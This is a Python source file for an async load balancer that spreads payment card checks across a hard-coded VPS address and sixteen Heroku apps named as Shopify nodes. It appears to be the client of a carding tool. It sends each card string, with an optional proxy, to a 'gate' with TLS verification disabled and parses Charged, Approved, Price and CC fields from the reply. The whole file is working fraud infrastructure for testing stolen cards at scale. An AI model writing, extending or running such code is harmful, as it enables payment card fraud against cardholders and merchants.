"""
node_client.py — compact load balancer (VPS + Heroku pools)
"""
import asyncio, aiohttp, time, random
from dataclasses import dataclass, field
from yarl import URL as _URL

_CHECK_TIMEOUT = 25
_PROBE_TIMEOUT = 5
_WORKERS_CAP   = 600

_VPS = [{"name": f"VPS-{i:02d}", "url": f"http://5.83.136.15:{8080 + i}"} for i in range(1, 21)]
_HEROKU = [
    {"name": "HRK-1",  "url": "https://shopify-node-01-fa804790b066.herokuapp.com"},
    {"name": "HRK-2",  "url": "https://shopify-node-02-5d80fe0fae9d.herokuapp.com"},
    {"name": "HRK-3",  "url": "https://shopify-node-03-7b915aee260c.herokuapp.com"},
    {"name": "HRK-4",  "url": "https://shopify-node-04-9f54617b5f51.herokuapp.com"},
    {"name": "HRK-5",  "url": "https://shopify-node-05-e694c739af29.herokuapp.com"},
    {"name": "HRK-6",  "url": "https://shopify-node-06-4a2c59639117.herokuapp.com"},
    {"name": "HRK-7",  "url": "https://shopify-node-07-af78dc9279cc.herokuapp.com"},
    {"name": "HRK-8",  "url": "https://shopify-node-08-c3cbe9a9bc28.herokuapp.com"},
    {"name": "HRK-9",  "url": "https://shopify-node-09-d8c5a66ff0cc.herokuapp.com"},
    {"name": "HRK-10", "url": "https://shopify-node-10-74a7f7b6baa2.herokuapp.com"},
    {"name": "HRK-11", "url": "https://shopify-node-11-10fe41f6dad6.herokuapp.com"},
    {"name": "HRK-12", "url": "https://shopify-node-12-0c4c280f0204.herokuapp.com"},
    {"name": "HRK-13", "url": "https://shopify-node-13-37a98de842ac.herokuapp.com"},
    {"name": "HRK-14", "url": "https://shopify-node-14-ac40e074c105.herokuapp.com"},
    {"name": "HRK-15", "url": "https://shopify-node-15-428b56f43e62.herokuapp.com"},
    {"name": "HRK-16", "url": "https://shopify-node-16-b1cd83a7d6da.herokuapp.com"},
]

@dataclass
class _Node:
    name: str
    url: str
    type: str = "vps"
    active: int = 0
    busy: int = 0
    cap: int = _WORKERS_CAP
    cooldown: float = 0.0
    avg_rtt: float = 0.0

    @property
    def available(self) -> bool: return time.monotonic() >= self.cooldown

    def pick_score(self) -> float:
        util = min(self.active / max(self.cap, 1), 1.0)
        return util + random.uniform(0, 0.01)

class NodeManager:
    def __init__(self, configs: list, node_type: str):
        self._nodes = [_Node(name=c["name"], url=c["url"].rstrip("/"), type=node_type) for c in configs]
        self._session = None

    async def _sess(self):
        if self._session is None or self._session.closed:
            self._session = aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=0, limit_per_host=64, ssl=False), timeout=aiohttp.ClientTimeout(total=_CHECK_TIMEOUT))
        return self._session

    async def close(self):
        if self._session and not self._session.closed: await self._session.close()

    def summary(self):
        return {
            "total": len(self._nodes),
            "available": sum(1 for n in self._nodes if n.available),
        }

    async def check(self, card: str, proxy: str = "", retries: int = 1):
        sess = await self._sess()
        for _ in range(retries + 1):
            avail = [n for n in self._nodes if n.available]
            if not avail: break
            node = min(avail, key=lambda n: n.pick_score())
            params = card
            if proxy: params += f"&proxy={proxy}"
            url = f"{node.url}/?{params}"
            node.active += 1
            t0 = time.monotonic()
            try:
                async with sess.get(_URL(url, encoded=True), ssl=False) as r:
                    if r.status >= 500:
                        node.cooldown = time.monotonic() + 30
                        node.active -= 1
                        continue
                    body = await r.json(content_type=None)
                    node.active -= 1
                    rtt = (time.monotonic() - t0) * 1000
                    node.avg_rtt = rtt if not node.avg_rtt else 0.8 * node.avg_rtt + 0.2 * rtt
                    return {
                        "Response": str(body.get("Response", "UNKNOWN")),
                        "Gate":     str(body.get("Gate", "Shopify")),
                        "Charged":  str(body.get("Charged", "False")),
                        "Approved": str(body.get("Approved", "False")),
                        "Price":    str(body.get("Price", "0 USD")),
                        "Time":     str(body.get("Time", "")),
                        "CC":       str(body.get("CC", card)),
                        "_node":    node.name,
                        "_rtt_ms":  round(rtt),
                    }
            except Exception:
                node.active -= 1
                node.cooldown = time.monotonic() + 15
                continue
        return None

NODE_MANAGER_VPS = NodeManager(_VPS, "vps")
NODE_MANAGER_HEROKU = NodeManager(_HEROKU, "heroku")
